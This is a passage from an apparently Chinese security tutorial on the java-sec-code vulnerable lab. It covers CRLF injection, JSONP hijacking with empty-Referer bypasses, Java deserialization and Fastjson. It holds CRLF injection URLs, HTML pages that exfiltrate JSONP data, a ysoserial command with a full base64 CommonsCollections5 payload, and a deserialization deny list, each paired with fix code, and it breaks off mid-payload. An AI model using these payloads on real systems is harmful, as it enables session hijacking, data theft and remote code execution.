<h2 id="5-CRLFInjection"><a href="#5-CRLFInjection" class="headerlink" title="5.CRLFInjection"></a>5.CRLFInjection</h2><p>​    CRLF是”回车+换行”(\r\n)(编码后是%0D%0A)的简称,在HTTP中,HTTP Header和HTTP Body是用两个CRLF来分割的。浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。CRLF漏洞可以造成Cookie会话固定和反射型XSS(可过waf)的危害，注入XSS的利用方式：连续使用两次%0d%oa就会造成header和body之间的分离，就可以在其中插入xss代码形成反射型xss漏洞。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;baidu.com&#x2F;xxx%0a%0dSet-Cookie: test123&#x3D;123  &#x2F;&#x2F; 恶意添加修改信息</span><br></pre></td></tr></table></figure>

<p>​    关于实战，这里有几个案例，可以学习一波。</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://www.v0n.top/2020/01/29/CRLF注入/">CRLF注入</a></li>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">Bottle HTTP 头注入漏洞探究</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/6648767.html">案例</a></li>
</ol>
<p>但这个问题实际上已经在所有的现在的java EE应用服务器上修复了。如果你想关注这个漏洞，你应该在目标平台测试是否允许将CRLF插入到HTTP头中。不出意外的话，这个漏洞已经在大部分的目前的应用服务器上修复了，无论是用什么语言编写的。</p>
<p>核心代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;crlf&quot;)</span><br><span class="line">public class CRLFInjection &#123;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;&#x2F;safecode&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public void crlf(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">        response.addHeader(&quot;test1&quot;, request.getParameter(&quot;test1&quot;));</span><br><span class="line">        response.setHeader(&quot;test2&quot;, request.getParameter(&quot;test2&quot;));</span><br><span class="line">        String author &#x3D; request.getParameter(&quot;test3&quot;);</span><br><span class="line">        Cookie cookie &#x3D; new Cookie(&quot;test3&quot;, author);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问<a target="_blank" rel="noopener" href="http://localhost:8080/java_sec_code_war/crlf/safecode">http://localhost:8080/java_sec_code_war/crlf/safecode</a></p>
<p>?test1=111%0d%0ax&amp;test2=111%0d%0a111</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909095847712.png" alt="image-20210909095847712"></p>
<h2 id="6-Jsonp"><a href="#6-Jsonp" class="headerlink" title="6.Jsonp"></a>6.Jsonp</h2><p>JSONP是实现跨域的一种技术，应用于Web站点需要跨域获取数据的场景。当开发者使用不当时，攻击者可以恶意利用jsonp劫持数据。</p>
<p>举例说明如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在 jQuery 中，可以通过使用JSONP 形式的回调函数来加载其他网域的JSON数据，如 &quot;myurl?callback&#x3D;?&quot;。jQuery 将自动替换 ? 为正确的函数名，以执行回调函数。 </span><br><span class="line">jQuery 会把？注册成window.? 的系统函数，然后映射调用。</span><br><span class="line">一般用于跨域ajax请求，提供URL的一方会返回一个callback函数的JSON数据，然后回调时就能获取了。</span><br><span class="line"> </span><br><span class="line">请求的URL例子：</span><br><span class="line">&quot;myurl?callback&#x3D;123123123&quot; &#x2F;&#x2F;这个123123就是?号，jquery自动生成的。</span><br><span class="line">返回的数据例子：</span><br><span class="line">123123123(&#123;“id”:&quot;1&quot;,&quot;name&quot;:&quot;张三&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p>核心代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ControllerAdvice</span><br><span class="line">public class JSONPAdvice extends AbstractJsonpResponseBodyAdvice &#123;</span><br><span class="line"></span><br><span class="line">    public JSONPAdvice() &#123;</span><br><span class="line">        super(&quot;callback&quot;, &quot;cback&quot;); &#x2F;&#x2F; callback的参数名，可以为多个</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当有接口返回了Object(比如JSONObject或者JavaBean，但是不支持String)，只要在参数中加入<code>callback=test</code>或<code>cback=test</code>就会自动变成JSONP接口。比如下面代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;advice&quot;, produces &#x3D; MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">public JSONObject advice() &#123;</span><br><span class="line">    String info &#x3D; &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;</span><br><span class="line">    return JSON.parseObject(info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然上面代码指定了response的<code>content-type</code>为<code>application/json</code>，但是在<code>AbstractJsonpResponseBodyAdvice</code>类中会设置为<code>application/javascript</code>，提供给前端调用。</p>
<p>设置<code>content-type</code>为<code>application/javascript</code>的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected MediaType getContentType(MediaType contentType, ServerHttpRequest request, ServerHttpResponse response) &#123;</span><br><span class="line">	return new MediaType(&quot;application&quot;, &quot;javascript&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且还会判断callback的参数只是否是有效的，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static final Pattern CALLBACK_PARAM_PATTERN &#x3D; Pattern.compile(&quot;[0-9A-Za-z_\\.]*&quot;);</span><br><span class="line"></span><br><span class="line">protected boolean isValidJsonpQueryParam(String value) &#123;</span><br><span class="line">	return CALLBACK_PARAM_PATTERN.matcher(value).matches();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="安全问题："><a href="#安全问题：" class="headerlink" title="安全问题："></a>安全问题：</h3><blockquote>
<p>使用<code>AbstractJsonpResponseBodyAdvice</code>能避免callback导致的XSS问题，但是会带来一个新的风险：可能有的JSON接口强行被设置为了JSONP，导致JSON劫持。所以使用<code>AbstractJsonpResponseBodyAdvice</code>，需要默认校验所有jsonp接口的referer是否合法。</p>
</blockquote>
<p>PS：</p>
<p>在Spring Framework 5.1，移除了<code>AbstractJsonpResponseBodyAdvice</code>类。Springboot <code>2.1.0 RELEASE</code>默认使用spring framework版本5.1.2版本。也就是在SpringBoot <code>2.1.0 RELEASE</code>及以后版本都不能使用该功能，用CORS替代。</p>
<p><a target="_blank" rel="noopener" href="https://docs.spring.io/spring/docs/5.0.x/javadoc-api/org/springframework/web/servlet/mvc/method/annotation/AbstractJsonpResponseBodyAdvice.html">https://docs.spring.io/spring/docs/5.0.x/javadoc-api/org/springframework/web/servlet/mvc/method/annotation/AbstractJsonpResponseBodyAdvice.html</a></p>
<blockquote>
<p>Will be removed as of Spring Framework 5.1, use CORS instead.</p>
</blockquote>
<h3 id="1-前端调用代码的"><a href="#1-前端调用代码的" class="headerlink" title="1.前端调用代码的"></a>1.前端调用代码的</h3><ul>
<li>使用ajax的jsonp调用方式，运行后会弹框<code>JoyChou</code>。</li>
<li>使用script src方式，运行后会弹框<code>JoyChou</code>。</li>
</ul>
<p>使用ajax的jsonp调用方式代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;UTF-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;jquery&#x2F;3.4.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JavaScript&quot;&gt;</span><br><span class="line">$(document).ready(function() &#123;</span><br><span class="line">	$.ajax(&#123;</span><br><span class="line">		url:&#39;http:&#x2F;&#x2F;localhost:8080&#x2F;jsonp&#x2F;advice&#39;,</span><br><span class="line">		dataType:&#39;jsonp&#39;,</span><br><span class="line">		success:function(data)&#123;</span><br><span class="line">			alert(data.name)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>script src方式代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	function aaa(data)&#123;</span><br><span class="line">		alert(JSON.stringify(data));</span><br><span class="line">	&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;jsonp&#x2F;vuln&#x2F;referer?callback_&#x3D;aaa&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>script src方法 测试如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909105509839.png" alt="image-20210909105509839"></p>
<h3 id="2-空Referer绕过"><a href="#2-空Referer绕过" class="headerlink" title="2.空Referer绕过"></a>2.空Referer绕过</h3><p>有时候开发同学为了测试方便，JSONP接口能直接访问，不直接访问做了Referer限制。正常来讲，前端发起的请求默认都会带着Referer，所以简单说下如何绕过空Referer。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;vuln&#x2F;emptyReferer&quot;, produces &#x3D; &quot;application&#x2F;javascript&quot;)</span><br><span class="line">public String emptyReferer(HttpServletRequest request) &#123;</span><br><span class="line">    String referer &#x3D; request.getHeader(&quot;referer&quot;);</span><br><span class="line"></span><br><span class="line">    if (null !&#x3D; referer &amp;&amp; SecurityUtil.checkURL(referer) &#x3D;&#x3D; null) &#123;</span><br><span class="line">        return &quot;error&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String callback &#x3D; request.getParameter(this.callback);</span><br><span class="line">    return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>增加了对referer的检测我们可以使用如下方法进行绕过</p>
<h4 id="1-添加no-referrer-参数"><a href="#1-添加no-referrer-参数" class="headerlink" title="1.添加no-referrer 参数"></a>1.添加no-referrer 参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;referrer&quot; content&#x3D;&quot;no-referrer&quot; &#x2F;&gt;      &#x2F;&#x2F;no-referrer</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	function test(data)&#123;</span><br><span class="line">		alert(JSON.stringify(data));</span><br><span class="line">	&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;jsonp&#x2F;vuln&#x2F;emptyReferer?callback_&#x3D;test&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-使用iframe标签进行绕过"><a href="#2-使用iframe标签进行绕过" class="headerlink" title="2.使用iframe标签进行绕过"></a>2.使用iframe标签进行绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;referrer&quot; content&#x3D;&quot;no-referrer&quot; &#x2F;&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;javascript:&#39;&lt;script&gt;function test(data)&#123;alert(JSON.stringify(data));&#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;jsonp&#x2F;vuln&#x2F;emptyReferer?callback_&#x3D;test&gt;&lt;&#x2F;script&gt;&#39;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>测试如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909111157468.png" alt="image-20210909111157468"></p>
<p>修复代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;sec&#x2F;checkReferer&quot;, produces &#x3D; &quot;application&#x2F;javascript&quot;)</span><br><span class="line">public String safecode(HttpServletRequest request) &#123;</span><br><span class="line">    String referer &#x3D; request.getHeader(&quot;referer&quot;);</span><br><span class="line"></span><br><span class="line">    if (SecurityUtil.checkURL(referer) &#x3D;&#x3D; null) &#123;</span><br><span class="line">        return &quot;error&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String callback &#x3D; request.getParameter(this.callback);</span><br><span class="line">    return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不管referer是否为null都进行判断</p>
<h3 id="3-fastjsonp-to-jsonp"><a href="#3-fastjsonp-to-jsonp" class="headerlink" title="3.fastjsonp to jsonp"></a>3.fastjsonp to jsonp</h3><p>核心代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(value &#x3D; &quot;&#x2F;fastjsonp&#x2F;getToken&quot;, produces &#x3D; &quot;application&#x2F;javascript&quot;)</span><br><span class="line">public String getCsrfToken2(HttpServletRequest request) &#123;</span><br><span class="line">    CsrfToken csrfToken &#x3D; cookieCsrfTokenRepository.loadToken(request); &#x2F;&#x2F; get csrf token</span><br><span class="line"></span><br><span class="line">    String callback &#x3D; request.getParameter(&quot;fastjsonpCallback&quot;);</span><br><span class="line">    if (StringUtils.isNotBlank(callback)) &#123;</span><br><span class="line">        JSONPObject jsonpObj &#x3D; new JSONPObject(callback);</span><br><span class="line">        jsonpObj.addParameter(csrfToken);</span><br><span class="line">        return jsonpObj.toString();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return csrfToken.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909143444477.png" alt="image-20210909143444477"></p>
<h2 id="7-Deserialize-序列化与反序列化"><a href="#7-Deserialize-序列化与反序列化" class="headerlink" title="7.Deserialize 序列化与反序列化"></a>7.Deserialize 序列化与反序列化</h2><p>​    Java程序使用ObjectInputStream对象的readObject方法将反序列化数据转换为java对象。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">     * java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64</span><br><span class="line">     * Add the result to rememberMe cookie.</span><br><span class="line">     * &lt;p&gt;</span><br><span class="line">     * http:&#x2F;&#x2F;localhost:8080&#x2F;deserialize&#x2F;rememberMe&#x2F;vuln</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @RequestMapping(&quot;&#x2F;rememberMe&#x2F;vuln&quot;)</span><br><span class="line">    public String rememberMeVul(HttpServletRequest request)</span><br><span class="line">            throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Cookie cookie &#x3D; getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"></span><br><span class="line">        if (null &#x3D;&#x3D; cookie) &#123;</span><br><span class="line">            return &quot;No rememberMe cookie. Right?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String rememberMe &#x3D; cookie.getValue();</span><br><span class="line">        byte[] decoded &#x3D; Base64.getDecoder().decode(rememberMe);</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bytes &#x3D; new ByteArrayInputStream(decoded);</span><br><span class="line">        ObjectInputStream in &#x3D; new ObjectInputStream(bytes);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">        return &quot;Are u ok?&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>代码相对来说也比较简单使用Java程序中类ObjectInputStream的readObject方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的class对象，ObjectStreamClass包含了类的名称及serialVersionUID。</p>
<p>利用方式如下：</p>
<p>使用ysoserial.jar生成payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64</span><br><span class="line">rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0&#x2F;A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR&#x2F;bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo&#x2F;2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAEm9wZW4gLWEgQ2FsY3VsYXRvcnQABGV4ZWN1cQB+ADIAAAABcQB+ADdzcQB+ACdzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg&#x3D;</span><br></pre></td></tr></table></figure>

<p>访问页面</p>
<p><a target="_blank" rel="noopener" href="http://192.168.8.103:8080/java_sec_code_war/deserialize/rememberMe/vuln">http://192.168.8.103:8080/java_sec_code_war/deserialize/rememberMe/vuln</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210926172201962.png" alt="image-20210926172201962"></p>
<p>修复代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;rememberMe&#x2F;security&quot;)</span><br><span class="line">public String rememberMeBlackClassCheck(HttpServletRequest request)</span><br><span class="line">        throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    Cookie cookie &#x3D; getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"></span><br><span class="line">    if (null &#x3D;&#x3D; cookie) &#123;</span><br><span class="line">        return &quot;No rememberMe cookie. Right?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String rememberMe &#x3D; cookie.getValue();</span><br><span class="line">    byte[] decoded &#x3D; Base64.getDecoder().decode(rememberMe);</span><br><span class="line"></span><br><span class="line">    ByteArrayInputStream bytes &#x3D; new ByteArrayInputStream(decoded);</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        AntObjectInputStream in &#x3D; new AntObjectInputStream(bytes);  &#x2F;&#x2F; throw InvalidClassException</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125; catch (InvalidClassException e) &#123;</span><br><span class="line">        logger.info(e.toString());</span><br><span class="line">        return e.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;I&#39;m very OK.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修复方式是通过Hook resolveClass来校验反序列化的类</p>
<blockquote>
<p>序列化数据结构可以了解到包含了类的名称及serialVersionUID的ObjectStreamClass描述符在序列化对象流的前面位置，且在readObject反序列化时首先会调用resolveClass读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。这个方法最早是由IBM的研究人员Pierre Ernst在2013年提出《<a target="_blank" rel="noopener" href="https://www.ibm.com/developerworks/library/se-lookahead/">Look-ahead Java deserialization</a>》</p>
</blockquote>
<p>跟入后对应代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 只允许反序列化SerialObject class</span><br><span class="line"> *</span><br><span class="line"> * 在应用上使用黑白名单校验方案比较局限，因为只有使用自己定义的AntObjectInputStream类，进行反序列化才能进行校验。</span><br><span class="line"> * 类似fastjson通用类的反序列化就不能校验。</span><br><span class="line"> * 但是RASP是通过HOOK java&#x2F;io&#x2F;ObjectInputStream类的resolveClass方法，全局的检测白名单。</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line">@Override</span><br><span class="line">protected Class&lt;?&gt; resolveClass(final ObjectStreamClass desc)</span><br><span class="line">        throws IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    String className &#x3D; desc.getName();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Deserialize class name: org.joychou.security.AntObjectInputStream$MyObject</span><br><span class="line">    logger.info(&quot;Deserialize class name: &quot; + className);</span><br><span class="line"></span><br><span class="line">    String[] denyClasses &#x3D; &#123;&quot;java.net.InetAddress&quot;,</span><br><span class="line">                            &quot;org.apache.commons.collections.Transformer&quot;,</span><br><span class="line">                            &quot;org.apache.commons.collections.functors&quot;&#125;;</span><br><span class="line"></span><br><span class="line">    for (String denyClass : denyClasses) &#123;</span><br><span class="line">        if (className.startsWith(denyClass)) &#123;</span><br><span class="line">            throw new InvalidClassException(&quot;Unauthorized deserialization attempt&quot;, className);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return super.resolveClass(desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果还是不太明白，可以参考：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/41/">浅谈Java反序列化漏洞修复方案</a></li>
<li><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2019/11/20/Java反序列化过程深究/">Java反序列化过程深究</a></li>
</ol>
<h2 id="8-Fastjson"><a href="#8-Fastjson" class="headerlink" title="8.Fastjson"></a>8.Fastjson</h2><p>FastJson是开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到Java Bean。</p>
<p>漏洞被利用本质找到一条有效的攻击链，攻击链的末端就是有代码执行能力的类，来达到我们想做的事情，一般都是用来RCE（远程命令执行）。构造一个触发器，也就是通过什么方式来让攻击链执行你想要的代码。触发器可以通过很多方式，比如静态代码块、构造方法等等。</p>
<p>Fastjson反序列化漏洞被利用的原因，可以归结为两方面：</p>
<p>Fastjson提供了反序列化功能，允许用户在输入JSON串时通过“@type”键对应的value指定任意反序列化类名；<br>Fastjson自定义的反序列化机制会使用反射生成上述指定类的实例化对象，并自动调用该对象的setter方法及部分getter方法。<br>攻击者可以构造恶意请求，使目标应用的代码执行流程进入这部分特定setter或getter方法，若上述方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。官方采用了黑名单方式对反序列化类名校验，但随着时间的推移及自动化漏洞挖掘能力的提升。新Gadget会不断涌现，黑名单这种治标不治本的方式只会导致不断被绕过，从而对使用该组件的用户带来不断升级版本的困扰。</p>
<p>对编程人员而言，在使用Fastjson反序列化时会使用到Fastjson所提供的几个静态方法：</p>
<p>parse (String text)</p>
<p>parseObject(String text)</p>
<p>parseObject(String text, Class clazz)</p>
<p>无论使用上述哪种方式处理JSON字符串，都会有机会调用目标类中符合要求的Getter方法或者Setter方法，如果一个类中的Getter或者Setter方法满足调用条件并且存在可利用点，那么这个攻击链就产生了。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    @RequestMapping(value &#x3D; &quot;&#x2F;deserialize&quot;, method &#x3D; &#123;RequestMethod.POST&#125;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String Deserialize(@RequestBody String params) &#123;</span><br><span class="line">        &#x2F;&#x2F; 如果Content-Type不设置application&#x2F;json格式，post数据会被url编码</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; 将post提交的string转换为json</span><br><span class="line">            JSONObject ob &#x3D; JSON.parseObject(params);</span><br><span class="line">            return ob.get(&quot;name&quot;).toString();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        &#x2F;&#x2F; Open calc in mac</span><br><span class="line">        String payload &#x3D; &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, 